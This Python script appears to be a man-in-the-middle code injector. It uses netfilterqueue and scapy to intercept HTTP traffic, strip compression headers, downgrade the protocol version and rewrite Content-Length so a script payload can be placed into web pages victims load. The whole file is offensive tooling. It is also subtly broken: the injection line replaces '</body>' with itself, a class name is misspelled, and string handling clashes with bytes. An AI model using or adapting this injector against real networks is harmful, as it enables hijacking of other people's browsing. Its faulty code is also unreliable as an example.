#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


ack_list = []
#def packet(packet, load):


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    ip_packet = scapy.IP(packet.get_payload())
    if ip_packet.haslayer(scapy.Raw):
        load = ip_packet[scapy.Raw].load
        if ip_packet[scapy.TCP].dport == 10000:
            print("[+] HTTP Request")
            load = re.sub(r"Accept-Encoding:.*?\r\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif ip_packet[scapy.TCP].sport == 10000:
            print("[+] HTTP Response")
            injeckt = "<script>alert(1);</script>"
            load = load.replace("</body>", "</body>")
            content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injeckt)
                load = load.replace(content_length, str(new_content_length))

        if load != ip_packet[scapy.Raw].load:
            new_packet = set_load(packet, load)
            packet.set_payload(new_packet)

    packet.accept()


queue = netfilterqueue.NerfilterQueue()
queue.bind(0, process_packet)
queue.run()